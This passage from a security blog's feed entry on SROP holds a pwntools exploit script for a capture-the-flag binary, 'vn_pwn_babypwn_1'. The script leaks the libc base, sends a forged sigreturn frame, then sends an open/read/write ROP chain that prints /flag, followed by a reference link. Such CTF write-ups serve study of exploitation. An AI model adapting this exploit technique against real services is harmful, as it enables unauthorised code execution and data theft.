libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
